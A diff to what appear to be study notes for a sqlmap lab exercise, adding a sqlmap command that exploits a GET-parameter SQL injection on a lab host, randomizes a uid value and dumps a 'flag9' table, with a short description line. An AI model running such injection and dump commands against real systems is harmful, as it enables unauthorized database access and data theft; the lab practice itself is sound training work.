@@ -55,4 +55,6 @@
   --batch \
   --level=2 \
   --risk=2
-- Detection and exploit SQLi vulnerability in POST parameter id, while taking care of the anti-CSRF protection command
+- Detection and exploitation SQLi vulnerability in POST parameter id, while taking care of the anti-CSRF protection command
+- sqlmap 'http://94.237.122.95:33765/case9.php?id=1&uid=1907190900' --compressed --randomize=uid -D testdb -T flag9 --dump
+- Detection and exploitation SQLi vulnerability in GET parameter id, while taking care of the unique uid command
